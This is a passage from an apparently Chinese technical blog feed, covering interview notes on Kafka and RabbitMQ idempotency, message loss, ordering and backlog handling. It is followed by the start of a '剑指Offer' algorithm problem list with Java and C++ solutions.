152/153/154。消费者从 kafka 去消费的时候，也是按照这个顺序去消费。假如当消费者消费了 <code>offset=153</code> 的这条数据，刚准备去提交 offset 到 zookeeper，此时消费者进程被重启了。那么此时消费过的数据 1/2 的 offset 并没有提交，kafka 也就不知道你已经消费了 <code>offset=153</code> 这条数据。那么重启之后，消费者会找 kafka 说，嘿，哥儿们，你给我接着把上次我消费到的那个地方后面的数据继续给我传递过来。由于之前的 offset 没有提交成功，那么数据 1/2 会再次传过来，如果此时消费者没有去重的话，那么就会导致重复消费。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-10.png" alt="mq-10"></p><p>如果消费者干的事儿是拿一条数据就往数据库里写一条，会导致说，你可能就把数据 1/2 在数据库里插入了 2 次，那么数据就错啦。</p><p>其实重复消费不可怕，可怕的是你没考虑到重复消费之后，<strong>怎么保证幂等性</strong>。</p><p>举个例子吧。假设你有个系统，消费一条消息就往数据库里插入一条数据，要是你一个消息重复两次，你不就插入了两条，这数据不就错了？但是你要是消费到第二次的时候，自己判断一下是否已经消费过了，若是就直接扔了，这样不就保留了一条数据，从而保证了数据的正确性。</p><p>一条数据重复出现两次，数据库里就只有一条数据，这就保证了系统的幂等性。</p><p>幂等性，通俗点说，就一个数据，或者一个请求，给你重复来多次，你得确保对应的数据是不会改变的，<strong>不能出错</strong>。</p><p>所以第二个问题来了，怎么保证消息队列消费的幂等性？</p><p>其实还是得结合业务来思考，我这里给几个思路：</p><ul><li>比如你拿个数据要写库，你先根据主键查一下，如果这数据都有了，你就别插入了，update 一下好吧。</li><li>比如你是写 Redis，那没问题了，反正每次都是 set，天然幂等性。</li><li>比如你不是上面两个场景，那做的稍微复杂一点，你需要让生产者发送每条数据的时候，里面加一个全局唯一的 id，类似订单 id 之类的东西，然后你这里消费到了之后，先根据这个 id 去比如 Redis 里查一下，之前消费过吗？如果没有消费过，你就处理，然后这个 id 写 Redis。如果消费过了，那你就别处理了，保证别重复处理相同的消息即可。</li><li>比如基于数据库的唯一键来保证重复数据不会重复插入多条。因为有唯一键约束了，重复数据插入只会报错，不会导致数据库中出现脏数据。</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/mq-11.png" alt="mq-11"></p><p>当然，如何保证 MQ 的消费是幂等性的，需要结合具体的业务来看。</p><h1><span id="如何保证消息的可靠性传输或者说如何处理消息丢失的问题">如何保证消息的可靠性传输？或者说，如何处理消息丢失的问题？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>这个是肯定的，用 MQ 有个基本原则，就是<strong>数据不能多一条，也不能少一条</strong>，不能多，就是前面说的重复消费和幂等性问题。不能少，就是说这数据别搞丢了。那这个问题你必须得考虑一下。</p><p>如果说你这个是用 MQ 来传递非常核心的消息，比如说计费、扣费的一些消息，那必须确保这个 MQ 传递过程中<strong>绝对不会把计费消息给弄丢</strong>。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>数据的丢失问题，可能出现在生产者、MQ、消费者中，咱们从 RabbitMQ 和 Kafka 分别来分析一下吧。</p><h3><span id="rabbitmq">RabbitMQ</span></h3><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-message-lose.png" alt="rabbitmq-message-lose"></p><h4><span id="生产者弄丢了数据">生产者弄丢了数据</span></h4><p>生产者将数据发送到 RabbitMQ 的时候，可能数据就在半路给搞丢了，因为网络问题啥的，都有可能。</p><p>此时可以选择用 RabbitMQ 提供的事务功能，就是生产者<strong>发送数据之前</strong>开启 RabbitMQ 事务<code>channel.txSelect</code>，然后发送消息，如果消息没有成功被 RabbitMQ 接收到，那么生产者会收到异常报错，此时就可以回滚事务<code>channel.txRollback</code>，然后重试发送消息；如果收到了消息，那么可以提交事务<code>channel.txCommit</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开启事务</span></span><br><span class="line">channel.txSelect</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 这里发送消息</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    channel.txRollback</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里再次重发这条消息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交事务</span></span><br><span class="line">channel.txCommit</span><br></pre></td></tr></table></figure><p>但是问题是，RabbitMQ 事务机制（同步）一搞，基本上<strong>吞吐量会下来，因为太耗性能</strong>。</p><p>所以一般来说，如果你要确保说写 RabbitMQ 的消息别丢，可以开启 <code>confirm</code> 模式，在生产者那里设置开启 <code>confirm</code> 模式之后，你每次写的消息都会分配一个唯一的 id，然后如果写入了 RabbitMQ 中，RabbitMQ 会给你回传一个 <code>ack</code> 消息，告诉你说这个消息 ok 了。如果 RabbitMQ 没能处理这个消息，会回调你的一个 <code>nack</code> 接口，告诉你这个消息接收失败，你可以重试。而且你可以结合这个机制自己在内存里维护每个消息 id 的状态，如果超过一定时间还没接收到这个消息的回调，那么你可以重发。</p><p>事务机制和 <code>confirm</code> 机制最大的不同在于，<strong>事务机制是同步的</strong>，你提交一个事务之后会<strong>阻塞</strong>在那儿，但是 <code>confirm</code> 机制是<strong>异步</strong>的，你发送个消息之后就可以发送下一个消息，然后那个消息 RabbitMQ 接收了之后会异步回调你的一个接口通知你这个消息接收到了。</p><p>所以一般在生产者这块<strong>避免数据丢失</strong>，都是用 <code>confirm</code> 机制的。</p><h4><span id="rabbitmq-弄丢了数据">RabbitMQ 弄丢了数据</span></h4><p>就是 RabbitMQ 自己弄丢了数据，这个你必须<strong>开启 RabbitMQ 的持久化</strong>，就是消息写入之后会持久化到磁盘，哪怕是 RabbitMQ 自己挂了，<strong>恢复之后会自动读取之前存储的数据</strong>，一般数据不会丢。除非极其罕见的是，RabbitMQ 还没持久化，自己就挂了，<strong>可能导致少量数据丢失</strong>，但是这个概率较小。</p><p>设置持久化有<strong>两个步骤</strong>：</p><ul><li>创建 queue 的时候将其设置为持久化<br><br>这样就可以保证 RabbitMQ 持久化 queue 的元数据，但是它是不会持久化 queue 里的数据的。</li><li>第二个是发送消息的时候将消息的 <code>deliveryMode</code> 设置为 2<br><br>就是将消息设置为持久化的，此时 RabbitMQ 就会将消息持久化到磁盘上去。</li></ul><p>必须要同时设置这两个持久化才行，RabbitMQ 哪怕是挂了，再次重启，也会从磁盘上重启恢复 queue，恢复这个 queue 里的数据。</p><p>注意，哪怕是你给 RabbitMQ 开启了持久化机制，也有一种可能，就是这个消息写到了 RabbitMQ 中，但是还没来得及持久化到磁盘上，结果不巧，此时 RabbitMQ 挂了，就会导致内存里的一点点数据丢失。</p><p>所以，持久化可以跟生产者那边的 <code>confirm</code> 机制配合起来，只有消息被持久化到磁盘之后，才会通知生产者 <code>ack</code> 了，所以哪怕是在持久化到磁盘之前，RabbitMQ 挂了，数据丢了，生产者收不到 <code>ack</code>，你也是可以自己重发的。</p><h4><span id="消费端弄丢了数据">消费端弄丢了数据</span></h4><p>RabbitMQ 如果丢失了数据，主要是因为你消费的时候，<strong>刚消费到，还没处理，结果进程挂了</strong>，比如重启了，那么就尴尬了，RabbitMQ 认为你都消费了，这数据就丢了。</p><p>这个时候得用 RabbitMQ 提供的 <code>ack</code> 机制，简单来说，就是你必须关闭 RabbitMQ 的自动 <code>ack</code>，可以通过一个 api 来调用就行，然后每次你自己代码里确保处理完的时候，再在程序里 <code>ack</code> 一把。这样的话，如果你还没处理完，不就没有 <code>ack</code> 了？那 RabbitMQ 就认为你还没处理完，这个时候 RabbitMQ 会把这个消费分配给别的 consumer 去处理，消息是不会丢的。</p><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-message-lose-solution.png" alt="rabbitmq-message-lose-solution"></p><h3><span id="kafka">Kafka</span></h3><h4><span id="消费端弄丢了数据">消费端弄丢了数据</span></h4><p>唯一可能导致消费者弄丢数据的情况，就是说，你消费到了这个消息，然后消费者那边<strong>自动提交了 offset</strong>，让 Kafka 以为你已经消费好了这个消息，但其实你才刚准备处理这个消息，你还没处理，你自己就挂了，此时这条消息就丢咯。</p><p>这不是跟 RabbitMQ 差不多吗，大家都知道 Kafka 会自动提交 offset，那么只要<strong>关闭自动提交</strong> offset，在处理完之后自己手动提交 offset，就可以保证数据不会丢。但是此时确实还是<strong>可能会有重复消费</strong>，比如你刚处理完，还没提交 offset，结果自己挂了，此时肯定会重复消费一次，自己保证幂等性就好了。</p><p>生产环境碰到的一个问题，就是说我们的 Kafka 消费者消费到了数据之后是写到一个内存的 queue 里先缓冲一下，结果有的时候，你刚把消息写入内存 queue，然后消费者会自动提交 offset。然后此时我们重启了系统，就会导致内存 queue 里还没来得及处理的数据就丢失了。</p><h4><span id="kafka-弄丢了数据">Kafka 弄丢了数据</span></h4><p>这块比较常见的一个场景，就是 Kafka 某个 broker 宕机，然后重新选举 partition 的 leader。大家想想，要是此时其他的 follower 刚好还有些数据没有同步，结果此时 leader 挂了，然后选举某个 follower 成 leader 之后，不就少了一些数据？这就丢了一些数据啊。</p><p>生产环境也遇到过，我们也是，之前 Kafka 的 leader 机器宕机了，将 follower 切换为 leader 之后，就会发现说这个数据就丢了。</p><p>所以此时一般是要求起码设置如下 4 个参数：</p><ul><li>给 topic 设置 <code>replication.factor</code> 参数：这个值必须大于 1，要求每个 partition 必须有至少 2 个副本。</li><li>在 Kafka 服务端设置 <code>min.insync.replicas</code> 参数：这个值必须大于 1，这个是要求一个 leader 至少感知到有至少一个 follower 还跟自己保持联系，没掉队，这样才能确保 leader 挂了还有一个 follower 吧。</li><li>在 producer 端设置 <code>acks=all</code>：这个是要求每条数据，必须是<strong>写入所有 replica 之后，才能认为是写成功了</strong>。</li><li>在 producer 端设置 <code>retries=MAX</code>（很大很大很大的一个值，无限次重试的意思）：这个是<strong>要求一旦写入失败，就无限重试</strong>，卡在这里了。</li></ul><p>我们生产环境就是按照上述要求配置的，这样配置之后，至少在 Kafka broker 端就可以保证在 leader 所在 broker 发生故障，进行 leader 切换时，数据不会丢失。</p><h4><span id="生产者会不会弄丢数据">生产者会不会弄丢数据？</span></h4><p>如果按照上述的思路设置了 <code>acks=all</code>，一定不会丢，要求是，你的 leader 接收到消息，所有的 follower 都同步到了消息之后，才认为本次写成功了。如果没满足这个条件，生产者会自动不断的重试，重试无限次。</p><h1><span id="如何保证消息的顺序性">如何保证消息的顺序性？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实这个也是用 MQ 的时候必问的话题，第一看看你了不了解顺序这个事儿？第二看看你有没有办法保证消息是有顺序的？这是生产系统中常见的问题。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>我举个例子，我们以前做过一个 mysql <code>binlog</code> 同步的系统，压力还是非常大的，日同步数据要达到上亿，就是说数据从一个 mysql 库原封不动地同步到另一个 mysql 库里面去（mysql -&gt; mysql）。常见的一点在于说比如大数据 team，就需要同步一个 mysql 库过来，对公司的业务系统的数据做各种复杂的操作。</p><p>你在 mysql 里增删改一条数据，对应出来了增删改 3 条 <code>binlog</code> 日志，接着这三条 <code>binlog</code> 发送到 MQ 里面，再消费出来依次执行，起码得保证人家是按照顺序来的吧？不然本来是：增加、修改、删除；你愣是换了顺序给执行成删除、修改、增加，不全错了么。</p><p>本来这个数据同步过来，应该最后这个数据被删除了；结果你搞错了这个顺序，最后这个数据保留下来了，数据同步就出错了。</p><p>先看看顺序会错乱的俩场景：</p><ul><li><strong>RabbitMQ</strong>：一个 queue，多个 consumer。比如，生产者向 RabbitMQ 里发送了三条数据，顺序依次是 data1/data2/data3，压入的是 RabbitMQ 的一个内存队列。有三个消费者分别从 MQ 中消费这三条数据中的一条，结果消费者2先执行完操作，把 data2 存入数据库，然后是 data1/data3。这不明显乱了。</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-order-01.png" alt="rabbitmq-order-01"></p><ul><li><strong>Kafka</strong>：比如说我们建了一个 topic，有三个 partition。生产者在写的时候，其实可以指定一个 key，比如说我们指定了某个订单 id 作为 key，那么这个订单相关的数据，一定会被分发到同一个 partition 中去，而且这个 partition 中的数据一定是有顺序的。<br>消费者从 partition 中取出来数据的时候，也一定是有顺序的。到这里，顺序还是 ok 的，没有错乱。接着，我们在消费者里可能会搞<strong>多个线程来并发处理消息</strong>。因为如果消费者是单线程消费处理，而处理比较耗时的话，比如处理一条消息耗时几十 ms，那么 1 秒钟只能处理几十条消息，这吞吐量太低了。而多个线程并发跑的话，顺序可能就乱掉了。</li></ul><p><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-order-01.png" alt="kafka-order-01"></p><h3><span id="解决方案">解决方案</span></h3><h4><span id="rabbitmq">RabbitMQ</span></h4><p>拆分多个 queue，每个 queue 一个 consumer，就是多一些 queue 而已，确实是麻烦点；或者就一个 queue 但是对应一个 consumer，然后这个 consumer 内部用内存队列做排队，然后分发给底层不同的 worker 来处理。<br><img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/rabbitmq-order-02.png" alt="rabbitmq-order-02"></p><h4><span id="kafka">Kafka</span></h4><ul><li>一个 topic，一个 partition，一个 consumer，内部单线程消费，单线程吞吐量太低，一般不会用这个。</li><li>写 N 个内存 queue，具有相同 key 的数据都到同一个内存 queue；然后对于 N 个线程，每个线程分别消费一个内存 queue 即可，这样就能保证顺序性。</li></ul><p>!<img src="https://github.com/doocs/advanced-java/raw/master/docs/high-concurrency/images/kafka-order-02.png" alt="kafka-order-02"></p><h1><span id="如何解决消息队列的延时以及过期失效问题消息队列满了以后该怎么处理有几百万消息持续积压几小时说说怎么解决">如何解决消息队列的延时以及过期失效问题？消息队列满了以后该怎么处理？有几百万消息持续积压几小时，说说怎么解决？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>你看这问法，其实本质针对的场景，都是说，可能你的消费端出了问题，不消费了；或者消费的速度极其慢。接着就坑爹了，可能你的消息队列集群的磁盘都快写满了，都没人消费，这个时候怎么办？或者是这整个就积压了几个小时，你这个时候怎么办？或者是你积压的时间太长了，导致比如 RabbitMQ 设置了消息过期时间后就没了怎么办？</p><p>所以就这事儿，其实线上挺常见的，一般不出，一出就是大 case。一般常见于，举个例子，消费端每次消费之后要写 mysql，结果 mysql 挂了，消费端 hang 那儿了，不动了；或者是消费端出了个什么岔子，导致消费速度极其慢。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>关于这个事儿，我们一个一个来梳理吧，先假设一个场景，我们现在消费端出故障了，然后大量消息在 mq 里积压，现在出事故了，慌了。</p><h3><span id="大量消息在-mq-里积压了几个小时了还没解决">大量消息在 mq 里积压了几个小时了还没解决</span></h3><p>几千万条数据在 MQ 里积压了七八个小时，从下午 4 点多，积压到了晚上 11 点多。这个是我们真实遇到过的一个场景，确实是线上故障了，这个时候要不然就是修复 consumer 的问题，让它恢复消费速度，然后傻傻的等待几个小时消费完毕。这个肯定不能在面试的时候说吧。</p><p>一个消费者一秒是 1000 条，一秒 3 个消费者是 3000 条，一分钟就是 18 万条。所以如果你积压了几百万到上千万的数据，即使消费者恢复了，也需要大概 1 小时的时间才能恢复过来。</p><p>一般这个时候，只能临时紧急扩容了，具体操作步骤和思路如下：</p><ul><li>先修复 consumer 的问题，确保其恢复消费速度，然后将现有 consumer 都停掉。</li><li>新建一个 topic，partition 是原来的 10 倍，临时建立好原先 10 倍的 queue 数量。</li><li>然后写一个临时的分发数据的 consumer 程序，这个程序部署上去消费积压的数据，<strong>消费之后不做耗时的处理</strong>，直接均匀轮询写入临时建立好的 10 倍数量的 queue。</li><li>接着临时征用 10 倍的机器来部署 consumer，每一批 consumer 消费一个临时 queue 的数据。这种做法相当于是临时将 queue 资源和 consumer 资源扩大 10 倍，以正常的 10 倍速度来消费数据。</li><li>等快速消费完积压数据之后，<strong>得恢复原先部署的架构</strong>，<strong>重新</strong>用原先的 consumer 机器来消费消息。</li></ul><h3><span id="mq-中的消息过期失效了">mq 中的消息过期失效了</span></h3><p>假设你用的是 RabbitMQ，RabbtiMQ 是可以设置过期时间的，也就是 TTL。如果消息在 queue 中积压超过一定的时间就会被 RabbitMQ 给清理掉，这个数据就没了。那这就是第二个坑了。这就不是说数据会大量积压在 mq 里，而是<strong>大量的数据会直接搞丢</strong>。</p><p>这个情况下，就不是说要增加 consumer 消费积压的消息，因为实际上没啥积压，而是丢了大量的消息。我们可以采取一个方案，就是<strong>批量重导</strong>，这个我们之前线上也有类似的场景干过。就是大量积压的时候，我们当时就直接丢弃数据了，然后等过了高峰期以后，比如大家一起喝咖啡熬夜到晚上12点以后，用户都睡觉了。这个时候我们就开始写程序，将丢失的那批数据，写个临时程序，一点一点的查出来，然后重新灌入 mq 里面去，把白天丢的数据给他补回来。也只能是这样了。</p><p>假设 1 万个订单积压在 mq 里面，没有处理，其中 1000 个订单都丢了，你只能手动写程序把那 1000 个订单给查出来，手动发到 mq 里去再补一次。</p><h3><span id="mq-都快写满了">mq 都快写满了</span></h3><p>如果消息积压在 mq 里，你很长时间都没有处理掉，此时导致 mq 都快写满了，咋办？这个还有别的办法吗？没有，谁让你第一个方案执行的太慢了，你临时写程序，接入数据来消费，<strong>消费一个丢弃一个，都不要了</strong>，快速消费掉所有的消息。然后走第二个方案，到了晚上再补数据吧。</p><h1><span id="如果让你写一个消息队列该如何进行架构设计说一下你的思路">如果让你写一个消息队列，该如何进行架构设计？说一下你的思路。</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实聊到这个问题，一般面试官要考察两块：</p><ul><li>你有没有对某一个消息队列做过较为深入的原理的了解，或者从整体了解把握住一个消息队列的架构原理。</li><li>看看你的设计能力，给你一个常见的系统，就是消息队列系统，看看你能不能从全局把握一下整体架构设计，给出一些关键点出来。</li></ul><p>说实话，问类似问题的时候，大部分人基本都会蒙，因为平时从来没有思考过类似的问题，<strong>大多数人就是平时埋头用，从来不去思考背后的一些东西</strong>。类似的问题，比如，如果让你来设计一个 Spring 框架你会怎么做？如果让你来设计一个 Dubbo 框架你会怎么做？如果让你来设计一个 MyBatis 框架你会怎么做？</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>其实回答这类问题，说白了，不求你看过那技术的源码，起码你要大概知道那个技术的基本原理、核心组成部分、基本架构构成，然后参照一些开源的技术把一个系统设计出来的思路说一下就好。</p><p>比如说这个消息队列系统，我们从以下几个角度来考虑一下：</p><ul><li><p>首先这个 mq 得支持可伸缩性吧，就是需要的时候快速扩容，就可以增加吞吐量和容量，那怎么搞？设计个分布式的系统呗，参照一下 kafka 的设计理念，broker -&gt; topic -&gt; partition，每个 partition 放一个机器，就存一部分数据。如果现在资源不够了，简单啊，给 topic 增加 partition，然后做数据迁移，增加机器，不就可以存放更多数据，提供更高的吞吐量了？</p></li><li><p>其次你得考虑一下这个 mq 的数据要不要落地磁盘吧？那肯定要了，落磁盘才能保证别进程挂了数据就丢了。那落磁盘的时候怎么落啊？顺序写，这样就没有磁盘随机读写的寻址开销，磁盘顺序读写的性能是很高的，这就是 kafka 的思路。</p></li><li><p>其次你考虑一下你的 mq 的可用性啊？这个事儿，具体参考之前可用性那个环节讲解的 kafka 的高可用保障机制。多副本 -&gt; leader &amp; follower -&gt; broker 挂了重新选举 leader 即可对外服务。</p></li><li><p>能不能支持数据 0 丢失啊？可以的，参考我们之前说的那个 kafka 数据零丢失方案。</p></li></ul><p>mq 肯定是很复杂的，面试官问你这个问题，其实是个开放题，他就是看看你有没有从架构角度整体构思和设计的思维以及能力。确实这个问题可以刷掉一大批人，因为大部分人平时不思考这些东西。</p>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 消息队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剑指Offer</title>
      <link href="/2020/04/07/%E5%89%91%E6%8C%87OFFER/"/>
      <url>/2020/04/07/%E5%89%91%E6%8C%87OFFER/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>牛客网</p><a id="more"></a><!-- toc --><ul><li><a href="#数组">数组</a><ul><li><a href="#构建乘积数组-">构建乘积数组 -√</a></li><li><a href="#数组中重复的数字">数组中重复的数字 √</a></li><li><a href="#二维数组的查找">二维数组的查找 √</a></li><li><a href="#表示数值的字符串-">表示数值的字符串 -</a></li><li><a href="#和为s的两个数字">和为S的两个数字 √</a></li><li><a href="#和为s的连续正数序列">和为S的连续正数序列 √</a></li><li><a href="#扑克牌顺子">扑克牌顺子 √</a></li><li><a href="#调整数组顺序使奇数位于偶数前面">调整数组顺序使奇数位于偶数前面 √</a></li><li><a href="#数字在排序数组中出现的次数">数字在排序数组中出现的次数 √</a></li><li><a href="#最小的k个数-">最小的k个数 -√</a></li><li><a href="#数组中的逆序对-">数组中的逆序对 -</a></li><li><a href="#数组中出现次数超过一半的数字">数组中出现次数超过一半的数字 ×</a></li><li><a href="#顺时针打印矩阵">顺时针打印矩阵 ×</a></li></ul></li><li><a href="#字符串">字符串</a><ul><li><a href="#替换空格">替换空格 √</a></li><li><a href="#左旋转字符串">左旋转字符串 √</a></li><li><a href="#翻转单词顺序列">翻转单词顺序列 √</a></li><li><a href="#第一个只出现一次的字符">第一个只出现一次的字符 √</a></li><li><a href="#把字符串转化成整数">把字符串转化成整数 √</a></li><li><a href="#把数组排成最小的数-">把数组排成最小的数 -</a></li></ul></li><li><a href="#动态规划">动态规划</a><ul><li><a href="#正则表达式匹配-">正则表达式匹配 -</a></li><li><a href="#跳台阶">跳台阶 √</a></li><li><a href="#变态跳台阶">变态跳台阶 √</a></li><li><a href="#剪绳子">剪绳子 √</a></li><li><a href="#斐波那契">斐波那契 √</a></li><li><a href="#矩形覆盖">矩形覆盖 √</a></li><li><a href="#连续数组的最大和">连续数组的最大和 √</a></li><li><a href="#丑数">丑数 ×</a></li><li><a href="#字符串的排列-">字符串的排列 -</a></li></ul></li><li><a href="#栈和队列">栈和队列</a><ul><li><a href="#字符流中第一个不重复的字符">字符流中第一个不重复的字符 √</a></li><li><a href="#从尾到头打印链表">从尾到头打印链表 √</a></li><li><a href="#包含min函数的栈">包含min函数的栈 √</a></li><li><a href="#栈的压入弹出序列">栈的压入弹出序列 √</a></li></ul></li><li><a href="#链表">链表</a><ul><li><a href="#链表中环的入口结点">链表中环的入口结点 √</a></li><li><a href="#删除链表中重复的结点-">删除链表中重复的结点 -</a></li><li><a href="#合并两个排序的链表">合并两个排序的链表 √</a></li><li><a href="#链表中倒数第k个结点">链表中倒数第k个结点 √</a></li><li><a href="#反转链表">反转链表 √</a></li><li><a href="#复杂链表的复制">复杂链表的复制 √</a></li></ul></li><li><a href="#树">树</a><ul><li><a href="#重建二叉树">重建二叉树 √</a></li><li><a href="#二叉树的镜象">二叉树的镜象 √</a></li><li><a href="#从上到下打印二叉树">从上到下打印二叉树 √</a></li><li><a href="#按之字形顺序打印二叉树">按之字形顺序打印二叉树 √</a></li><li><a href="#对称的二叉树">对称的二叉树 √</a></li><li><a href="#二叉树的深度">二叉树的深度 √</a></li><li><a href="#序列化二叉树-">序列化二叉树 -</a></li><li><a href="#二叉搜索树的第k个结点">二叉搜索树的第k个结点 √</a></li><li><a href="#二叉树的下一个结点-">二叉树的下一个结点 -</a></li><li><a href="#树的子结构">树的子结构 √</a></li><li><a href="#二叉树中和为某一值的路径">二叉树中和为某一值的路径 √</a></li><li><a href="#二叉搜索树和双向链表-">二叉搜索树和双向链表 -</a></li><li><a href="#二叉搜索树的后序遍历序列">二叉搜索树的后序遍历序列 √</a></li></ul></li><li><a href="#二分查找">二分查找</a><ul><li><a href="#旋转数组的最小数字">旋转数组的最小数字 √</a></li></ul></li><li><a href="#搜索">搜索</a><ul><li><a href="#矩阵中的路径">矩阵中的路径 √</a></li><li><a href="#机器人的运动范围">机器人的运动范围 √</a></li></ul></li><li><a href="#栈和队列-1">栈和队列</a><ul><li><a href="#用两个栈实现队列">用两个栈实现队列 √</a></li></ul></li><li><a href="#位运算">位运算</a><ul><li><a href="#不用加减乘除做加法">不用加减乘除做加法 ×</a></li><li><a href="#二进制中1的个数">二进制中1的个数 ×</a></li><li><a href="#数组中只出现一次的数字">数组中只出现一次的数字 ×</a></li></ul></li><li><a href="#其他">其他</a><ul><li><a href="#求123n">求1+2+3+…+n ×</a></li><li><a href="#数据流的中位数-">数据流的中位数 -</a></li><li><a href="#滑动窗口的最大值-">滑动窗口的最大值 -</a></li><li><a href="#孩子们的游戏">孩子们的游戏 ×</a></li><li><a href="#数值的整数次方">数值的整数次方 √</a></li><li><a href="#整数中1出现的次数">整数中1出现的次数 ×</a></li></ul></li></ul><!-- tocstop --><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment">//没有思路</span></span><br><span class="line">? <span class="comment">//有思路做不出来</span></span><br><span class="line">- <span class="comment">//差一点</span></span><br><span class="line">√ <span class="comment">//完美解决</span></span><br></pre></td></tr></table></figure><h1><span id="数组">数组</span></h1><h2><span id="构建乘积数组-">构建乘积数组 -√</span></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] multiply(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">       <span class="keyword">int</span>[] B = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,product=<span class="number">1</span>;i&lt;A.length;product*=A[i],i++)&#123;</span><br><span class="line">           B[i]=product;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i=A.length-<span class="number">1</span>,product = <span class="number">1</span>; i &gt;= <span class="number">0</span>;product *= A[i],i--)&#123;</span><br><span class="line">           B[i]*=product;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> B;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">multiply</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> len = A.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;v(len, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, product = <span class="number">1</span>; i &lt; len;  product *= A[i++]) &#123;</span><br><span class="line">            v[i] = product;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>, product = <span class="number">1</span>; i &gt;= <span class="number">0</span>;  product *= A[i--]) &#123;</span><br><span class="line">            v[i] *= product;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2><span id="数组中重复的数字">数组中重复的数字 √</span></h2><p>在一个长度为n的数组里的所有数字都在0到n-1的范围内。 数组中某些数字是重复的，但不知道有几个数字是重复的。也不知道每个数字重复几次。请找出数组中任意一个重复的数字。 例如，如果输入长度为7的数组{2,3,1,0,2,5,3}，那么对应的输出是第一个重复的数字2。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">duplicate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> length, <span class="keyword">int</span>[] duplication)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nums == <span class="keyword">null</span> || length &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line"> 